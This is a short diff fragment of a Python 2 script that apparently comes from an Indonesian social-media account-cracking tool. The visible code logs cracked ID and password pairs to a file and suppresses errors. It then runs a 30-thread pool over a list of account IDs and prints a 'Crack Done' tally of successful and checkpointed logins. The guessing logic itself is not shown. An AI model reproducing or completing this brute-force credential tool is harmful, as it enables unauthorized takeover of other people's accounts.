@@ -819,19 +819,25 @@ def pilih_super():
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass9)		
-																	
 															
-		
 
-	
 
-	
+	except:
+            pass
 
-	
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 47 * '-'
+    print ' \x1b[1;92mCrack Done'
+    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
+    print 47 * '-'
+    raw_input('\x1b[1;93m Press enter to back')
+    choice_crack()
 
-	
 
-	
+if __name__ == '__main__':
+    reg()
+
 
 	
 
